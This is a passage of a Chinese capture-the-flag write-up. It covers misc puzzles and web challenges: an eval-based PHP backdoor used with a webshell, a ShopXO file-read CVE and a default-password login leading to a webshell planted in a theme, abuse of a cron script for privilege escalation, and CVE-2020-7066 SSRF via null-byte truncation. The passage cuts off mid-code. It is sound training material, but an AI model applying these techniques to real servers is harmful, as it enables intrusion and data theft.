operator">=</span>function<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token string">'\\w+'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>c<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>c<span class="token operator">--</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span>p<span class="token operator">=</span>p<span class="token operator">.</span>replace<span class="token punctuation">(</span>new RegExp<span class="token punctuation">(</span><span class="token string">'\\b'</span><span class="token operator">+</span>e<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'\\b'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> p<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token string">'15 n 14 a b c d e f g h i j k l m n o p q r s t u v w x y z 10 11 17="n"12 15 n 14 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 10 11 17="n"12 13=0 15 n 14 a b c d e f g h i j 10 11 16="n"13=$((13+1))12 1g("1f=\' \';1e=\'"\';16=\'#\';1j=\'(\';1i=\')\';1h=\'.\';1a=\';\';19=\'&lt;\';18=\'>\';1d=\'1c\';1b=\'&#123;\';1k=\'&#125;\';1t=\'0\';1u=\'1\';1s=\'2\';1r=\'3\';1n=\'4\';1m=\'5\';1l=\'6\';1q=\'7\';1p=\'8\';1o=\'9\';")'</span><span class="token punctuation">,</span><span class="token number">62</span><span class="token punctuation">,</span><span class="token number">93</span><span class="token punctuation">,</span><span class="token string">'||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||do|eval|done|num|in|for|Bn|An|Ce|Cc|Cb|Cn|_|Cl|Bm|Bk|alert|By|Bt|Bs|Cp|Dg|Df|De|Dj|Di|Dh|Dd|Dc|Da|Db'</span><span class="token operator">.</span>split<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>这里用的是网上找到的脚本</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> string</pre></td></tr><tr><td data-num="2"></td><td><pre>s <span class="token operator">=</span> <span class="token string">"$Bn$Ai$An$Ac$Al$Au$Ad$Ae$Bk$Cc$As$At$Ad$Ai$Ao$By$Ah$Ce$Ai$An$At$Bk$Am$Aa$Ai$An$Bs$Bt$Cn$Ap$Ar$Ai$An$At$Bs$Bm$Aw$Dd$Al$Ac$Da$Am$Ae$Cl$De$Ao$Cl$Dj$Ak$Ac$At$Df$Bm$Bt$Cb$Ar$Ae$At$Au$Ar$An$Bk$Da$Cb$Cp"</span></pre></td></tr><tr><td data-num="3"></td><td><pre>ll <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'$'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>list1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Bk'</span><span class="token punctuation">,</span><span class="token string">'Bm'</span><span class="token punctuation">,</span><span class="token string">'Bn'</span><span class="token punctuation">,</span><span class="token string">'Bs'</span><span class="token punctuation">,</span><span class="token string">'Bt'</span><span class="token punctuation">,</span><span class="token string">'By'</span><span class="token punctuation">,</span><span class="token string">'Cb'</span><span class="token punctuation">,</span><span class="token string">'Cc'</span><span class="token punctuation">,</span><span class="token string">'Ce'</span><span class="token punctuation">,</span><span class="token string">'Cl'</span><span class="token punctuation">,</span><span class="token string">'Cn'</span><span class="token punctuation">,</span><span class="token string">'Cp'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token string">'Da'</span><span class="token punctuation">,</span><span class="token string">'Db'</span><span class="token punctuation">,</span><span class="token string">'Dc'</span><span class="token punctuation">,</span><span class="token string">'Dd'</span><span class="token punctuation">,</span><span class="token string">'De'</span><span class="token punctuation">,</span><span class="token string">'Df'</span><span class="token punctuation">,</span><span class="token string">'Dg'</span><span class="token punctuation">,</span><span class="token string">'Dh'</span><span class="token punctuation">,</span><span class="token string">'Di'</span><span class="token punctuation">,</span><span class="token string">'Dj'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre>list2 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'#'</span><span class="token punctuation">,</span><span class="token string">'('</span><span class="token punctuation">,</span><span class="token string">')'</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span><span class="token string">'>'</span><span class="token punctuation">,</span><span class="token string">'_'</span><span class="token punctuation">,</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="7"></td><td><pre>list3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="8"></td><td><pre>list4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="9"></td><td><pre>s <span class="token operator">=</span> string<span class="token punctuation">.</span>ascii_lowercase</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>	list3<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'A%s'</span><span class="token operator">%</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>	list4<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#print(list3,'\n',list4)</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>t <span class="token operator">=</span> <span class="token string">''</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ll<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="17"></td><td><pre>	<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>list1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>		<span class="token keyword">if</span> ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>list1<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>			t <span class="token operator">+=</span> list2<span class="token punctuation">[</span>j<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="20"></td><td><pre>	<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>list3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>		<span class="token keyword">if</span> ll<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>list3<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>			t <span class="token operator">+=</span>list4<span class="token punctuation">[</span>k<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token comment">#include &lt;stdio.h>int main()&#123;print("w3lc0me_4o_9kct5")return 0&#125;</span></pre></td></tr></table></figure><h3 id="harley-quinn"><a class="anchor" href="#harley-quinn">#</a> Harley Quinn</h3><p>这题放了两个 hint，看起来当时开始的时候做出来的人还是不多的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357129.png" alt="image-20230404235705038"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304042357970.png" alt="image-20230404235716937"></p><p>音频到结尾部分，有电话音的声音，用工具 dtmf2num 进行破解：</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050010205.png" alt="image-20230405001023160"></p><p>#22283334447777338866#</p><p>对应 9 建</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre>ctfisfun</pre></td></tr></table></figure><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021579.png" alt="image-20230405002121528"></p><p>根据提示使用 FreeFileCamouflage 破解</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050021405.png" alt="image-20230405002156367"></p><h3 id="sail-a-boat-down-the-river"><a class="anchor" href="#sail-a-boat-down-the-river">#</a> Sail a boat down the river</h3><p>三解，三个 hint，当时的题还是很绕的</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050024187.png" alt="image-20230405002442142"></p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre>Hint<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>闪烁的光芒</pre></td></tr><tr><td data-num="3"></td><td><pre>是一行不是一列</pre></td></tr><tr><td data-num="4"></td><td><pre>加密方式很常见</pre></td></tr></table></figure><p>根据提示在 <code>118帧-130帧</code> 、 <code>200帧-208帧</code> 、 <code>320帧-334帧</code> 、 <code>410帧-418帧</code> 刷卡器出现闪光，摩斯密码</p><pre><code>-.-- .-- ---.. --.
</code></pre><p>解出得 yw8g</p><p>在 15 秒看到一张二维码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050032246.png" alt="image-20230405003255656"></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050035420.png" alt="image-20230405003538176"></p><p><span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMXR5Z3QwTm1fRzVmVGZWRmxneFZjclE=">https://pan.baidu.com/s/1tygt0Nm_G5fTfVFlgxVcrQ</span></p><p>输入上面得到的密码</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050036502.png" alt="image-20230405003637459"></p><p>密钥解熟读，然后根据排序即可得到： <code>52693795149137</code> <span class="exturl" data-url="aHR0cDovL3huLS1HRzBrYy02bzZocjY4Y2xnaGs0NmgudGY=">解密得到 GG0kc.tf</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050040420.png" alt="image-20230405004030369"></p><p>使用 <code>Overture</code> 打开得到 flag</p><h2 id="web"><a class="anchor" href="#web">#</a> Web</h2><h3 id="checkin"><a class="anchor" href="#checkin">#</a> CheckIN</h3><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Check_In<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> </span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">ClassName</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$decode</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token operator">=</span> @<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Ginkgo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span> <span class="token operator">=</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>                @<span class="token keyword">Eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">decode</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">x</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>                <span class="token keyword">return</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token keyword">new</span> <span class="token class-name">ClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>这里可以看到，源码很简单，接受参数，base64 解码后 eval 执行，先尝试 phpinfo ()</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050051333.png" alt="image-20230405005151284"></p><p>能够正常执行，但是看到在环境变量中过滤了很多函数</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050052378.png" alt="image-20230405005239337"></p><p>没有过滤 eval 函数，尝试构造木马用蚁剑连接后，发现不能正常运行命令，使用插件绕过</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304050058842.png" alt="image-20230405005812789"></p><h3 id="老八小超市儿"><a class="anchor" href="#老八小超市儿">#</a> 老八小超市儿</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051506808.png" alt="image-20230405150623656"></p><p>发现是 shopXO 电商系统，基于 thinkphp 开发的，去搜 CVE<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ4OTg1NzgwL2FydGljbGUvZGV0YWlscy8xMjIyMTgwOTE="> (71 条消息) shopxo 文件读取（CNVD-2021-15822）_xzhome 的博客 - CSDN 博客</span></p><p>这里直接用 poc 读取跟目录下面的 flag</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051513091.png" alt="image-20230405151307037"></p><p>提示 flag 在 root 下面尝试读取发现 return 500 估计是权限问题，看来还得找别的 cve，看了下版本是 1.8</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051508840.png" alt="image-20230405150840800"></p><p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8yMDk5NDAw">渗透测试 | shopxo 后台全版本获取 shell 复现 - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span> 这里看到需要先登录，尝试发现没有改默认密码</p><p>这里直接搜索主题</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051521200.png" alt="image-20230405152129091"></p><p>下载后添加一句话木马</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051534023.png" alt="image-20230405153407978"></p><p>再上传回去</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051535230.png" alt="image-20230405153555190"></p><p>这里直接添加</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051541059.png" alt="image-20230405154104996"></p><p>用蚂蚁剑连接上后确实访问不了这个 root 目录</p><p><img data-src="C:%5CUsers%5C%E9%99%8C%E8%B7%AF%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20230405154225020.png" alt="image-20230405154225020"></p><p>看到根目录还有一个 hint</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051543047.png" alt="image-20230405154340012"></p><p><span class="exturl" data-url="aHR0cDovL3huLS1hdXRvLXBtOWZsOGZveDNoLnNo">又看到 auto.sh</span></p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051544829.png" alt="image-20230405154429791"></p><p>没 60 秒刷新一次，那修改一下这个脚本就可以了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051548419.png" alt="image-20230405154814376"></p><p>然后去读 flag.hint 就可以了</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051549681.png" alt="image-20230405154912635"></p><h3 id="cve版签到"><a class="anchor" href="#cve版签到">#</a> cve 版签到</h3><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051554551.png" alt="image-20230405155402510"></p><p>cve 编号有了，看来简单复现一下就行 [<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vS3kxMjI2L3AvMTQzMzIxMTAuaHRtbA==">代码审计] CVE-2020-7066 漏洞复现 - Ky1226 - 博客园 (cnblogs.com)</span></p><p>简答来说 get_headers () 会截断 URL 中空字符后的内容</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051558787.png" alt="image-20230405155808748"></p><p>点击后多了一个 url</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051557371.png" alt="image-20230405155759326"></p><p>看起来是 SSRF，通过 %00 截断然后访问本地 ip</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608881.png" alt="image-20230405160815831"></p><p>要以 123 结尾</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051608003.png" alt="image-20230405160845950"></p><h3 id="ez三剑客-eznode"><a class="anchor" href="#ez三剑客-eznode">#</a> EZ 三剑客 - EzNode</h3><p>看到首页</p><p><img data-src="https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/202304051614492.png" alt="image-20230405161417448"></p><p>版本</p><figure class="highlight perl"><figcaption data-lang="perl"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"src"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token string">"version"</span><span class="token punctuation">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token string">"main"</span><span class="token punctuation">:</span> <span class="token string">"index.js"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token string">"license"</span><span class="token punctuation">:</span> <span class="token string">"MIT"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token string">"dependencies"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token string">"body-parser"</span><span class="token punctuation">:</span> <span class="token string">"1.19.0"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token string">"express"</span><span class="token punctuation">:</span> <span class="token string">"4.17.1"</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token string">"safer-eval"</span><span class="token punctuation">:</span> <span class="token string">"1.3.6"</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>源码</p><figure class="highlight js"><figcaption data-lang="JavaScript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">const</span> saferEval <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'safer-eval'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2019.7/WORKER1 找到一个很棒的库</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// 2020.1/WORKER2 老板说为了后期方便优化</span></pre></td></tr><tr><td data-num="15"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>path <span class="token operator">===</span> <span class="token string">'/eval'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">let</span> delay <span class="token operator">=</span> <span class="token number">60</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span>Number<span class="token punctuation">.</span><span class="token function">isInteger</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>      delay <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>delay<span class="token punctuation">,</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>delay<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">const</span> t <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> delay<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我 p 事</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'timeout'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Timeout!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>      <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>      <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/eval'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="39"></td><td><pre>  <span class="token keyword">let</span> response <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="41"></td><td><pre>    <span 